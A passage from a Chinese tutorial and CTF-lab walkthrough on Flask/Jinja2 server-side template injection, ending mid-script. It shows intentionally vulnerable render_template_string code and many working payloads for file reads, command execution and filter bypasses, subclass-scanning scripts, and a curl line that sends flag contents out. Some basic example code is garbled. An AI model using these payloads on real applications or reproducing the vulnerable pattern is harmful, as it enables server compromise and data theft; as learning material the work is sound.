---
title: flask的SSTI注入
url: https://buaq.net/go-149888.html
source: unSafe.sh - 不安全
date: 2023-02-18
fetch_date: 2025-10-04T07:20:20.113535
---

# flask的SSTI注入

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/79dd7225f801403468e112aa2acd2338.jpg)

flask的SSTI注入

写过很多的SSTI的题，但是一直没有总结过，最近也算是忙，这次，是稍微写写关于SSTI的东西，以后复习了可以好看看，也不至于每次都拿别人的payload关于fl
*2023-2-17 18:42:0
Author: [xz.aliyun.com(查看原文)](/jump-149888.htm)
阅读量:35
收藏*

---

写过很多的SSTI的题，但是一直没有总结过，最近也算是忙，这次，是稍微写写关于SSTI的东西，以后复习了可以好看看，也不至于每次都拿别人的payload

关于flask的SSTI注入，我们在了解他的注入原理之前，我们先看看flask框架是怎么使用的。

## flask基础

**route装饰器路由**

```
@app.route('/')
```

使用route（）装饰器告诉Flask 什么样的URL能触发函数。一个路由绑定一个函数。

例如

```
from flask import flask
app = Flask(__name__)
@app.route('/')
def test()"
   return 123
@app.route('/index/')
def hello_word():
    return 'hello word'
if __name__ == '__main__':
    app.run(port=5000)
```

访问 [http://127.0.0.1:5000/会返回123，但是](http://127.0.0.1:5000/%E4%BC%9A%E8%BF%94%E5%9B%9E123%EF%BC%8C%E4%BD%86%E6%98%AF) 访问[http://127.0.0.1:5000/index则会返回hello](http://127.0.0.1:5000/index%E5%88%99%E4%BC%9A%E8%BF%94%E5%9B%9Ehello) word

在用`@app.route('/')`的时候，在之前需要定义`app = Flask(__name__)`不然会报错

还可设置动态网址

```
@app.route("/<username>")
def hello_user(username):
  return "user:%s"%username
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170140-e572b65c-8986-1.png)

## 模板渲染方法

flask渲染方法有render\_template和render\_template\_string两种，我们需要做的就是，将我们想渲染的值传入模板的变量里

**render\_template()** 是用来渲染一个指定的文件的。

**render\_template\_string**则是用来渲染一个字符串的。

这个时候我们就需要了解一下flask的目录结构了

```
├── app.py
├── static
│   └── style.css
└── templates
    └── index.html
```

其中，static和templates都是需要自己新建的。其中templates目录里的index.html就是所谓的模板

我们写一个index.html

```
<html>
  <head>
    <title>{{title}}</title>
  </head>
 <body>
      <h1>Hello, {{name}}!</h1>
  </body>
</html>
```

这里面需要我们传入两个值，一个是title另一个是name。

```
from flask import Flask, request,render_template,render_template_string
app = Flask(__name__)
@app.route('/')
def index():
   return render_template("index.html",title='Home',name='user')
if __name__ == '__main__':
    app.run(port=5000)
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170215-fa2f4e20-8986-1.png)

在这里，我们手动传值的，所以是安全的

但是如果，我们传值的机会给用户

假如我们渲染的是一句话

```
from flask import Flask, request,render_template,render_template_string
@app.route('/test')
def test():
    id = request.args.get('id')
    html = '''
    <h1>%s</h1>
    '''%(id)
    return render_template_string(html)
if __name__ == '__main__':
    app.run(port=5000)
```

如果我们传入一个xss就会达到我们需要的效果

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170243-0a78e200-8987-1.png)

这就是传入的值被html直接运行回显，我们对代码进行微改。

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

再次传入xss就不能实现了

因为在传入相应的值得时候，会对值进行转义，这样就很能好多而避免了xss这些

所以SSTI注入形成的原因就是：开发人员因为懒惰，没有将渲染模板写成一个文件，而是直接用render\_template\_string来渲染，当然，如果有传值过程还行，但是如果没有传值过程，传入数据不经过转义，那可能就会导致SSTI注入。
那么漏洞原理就是因为不够严谨的构造代码导致的。

在写题前，先了解python的一些ssti的魔术方法。
`__class__`

> **用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。** 是类的一个内置属性，表示类的类型，返回**<type ‘type’> ；** 也是类的实例的属性，表示实例对象的类。

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170330-26fbcdb6-8987-1.png)

`__bases__`

> **用来查看类的基类**，**也可以使用数组索引来查看特定位置的值。** 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的**元组**。注意是直接父类！！！
> 使用语法：类名.bases

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170344-2f0f3010-8987-1.png)

`__mro__`也能获取基类

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170406-3c01308e-8987-1.png)

`__subclasses__()`
获取当前类的所有子类，即Object的子类

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170425-4764b3ba-8987-1.png)

而我们注入就是通过拿到Object的子类，使用其中的一些函数，进行文件读取或者命令执行。
`__init__`
重载子类，获取子类初始化的属性。
`__globals__`
函数会以字典的形式返回当前位置的全部全局变量
就比如：`os._wrap_close.__init__.__globals__`，可以获取到os中的一些函数，进行文件读取。

## 文件读取

`''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() #将read() 修改为 write() 即为写文件`
​

`[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件`

## 命令执行

`''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')`
// os.popen() 方法用于从一个命令打开一个管道。返回一个文件描述符号为fd的打开的文件对象。
**利用commands**
`{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('whoami')`
​

`{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')`
​

**os**
`.__init__.__globals__['popen']('type flag').read()`
当然，这些子类都不是那么容易找到的，这里贴一个脚本
上文的**59**就是子类WarningMessage的用它替换下面的\_wrap\_close即可

```
for i in range(300):
    data = {"code": '{{"".__class__.__base__.__subclasses__()['+ str(i) +']}}'}
    try:
        response = requests.post(url,data=data)
        #print(data)
        #print(response.text)
        if response.status_code == 200:
            if "_wrap_close" in response.text:
                print(i,"----->",response.text)
                break
    except :
        pass
```

还有jinjia语法下的小脚本。

```
{% for c in [].class.base.subclasses() %}{% if c.name=='catch_warnings' %}{{ c.init.globals['builtins'].eval("import('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

//查看flag

```
{% for c in [].class.base.subclasses() %}
{% if c.name=='catch_warnings' %}
{{ c.init.globals['builtins'].eval("import('os').popen('cat /flag').read()")}}
{% endif %}{% endfor %}
```

关于Flask SSTI 的实战题，其实有很多，但是大多都比较碎，知识点都不怎么集中，虽然可以学习到一些知识，但是并非系统的学习。但是我在一次偶然，发现了sstilab的靶场，是比较系统的可以学习到关于如何绕过过滤的一些知识。并且，新手小白，一般拿到题，都会有些迷茫，这里则会提供多种不同的解决思路。
下面放入每一关过滤的东西，以后要是写题遇到类似的，可以直接对比关卡，拿payload
![](https://xzfile.aliyuncs.com/media/upload/picture/20220209171758-2bdaf058-8989-1.png)

## level 1

法一

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('dir').read()")}}{% endif %}{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('dir').read()")}}{% endif %}{% endfor %}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170538-73274f3a-8987-1.png)

法二
师傅直接手搓脚本

```
import requests

url = "http://127.0.0.1:5000/level/1"

for i in range(300):
    data = {"code": '{{"".__class__.__base__.__subclasses__()['+ str(i) +']}}'}
    try:
        response = requests.post(url,data=data)
        #print(data)
        #print(response.text)
        if response.status_code == 200:
            if "_wrap_close" in response.text:
                print(i,"----->",response.text)
                break
    except :
        pass
```

找到我们使用的需要的子类，构造payload
`"".__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('type flag').read()`

## level 2

过滤了{{}}，可以使用{%%}代替,
但是`{%%}`，没有输出，所以需要我们print
`{%print("".__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('type flag').read())%}`
法二
`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{%print( c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('dir').read()"))%}{% endif %}{% endfor %}`

![](https://xzfile.aliyuncs.com/media/upload/picture/20220209170847-e3789690-8987-1.png)

脚本微改：
`data = {"code": '{%print("".__class__.__base__.__subclasses__()['+ str(i) +'])%}'}`

## level 3

无过滤，但是有回显
语句正确回显correct，语句不正确回显wrong

```
import requests

url = "http://192.168.0.108:5001/level/3"

for i in range(300):
    try:
        data = {"code": '{{"".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("curl http://127.0.0.1:5001/`cat flag`").read()}}'}
        response =...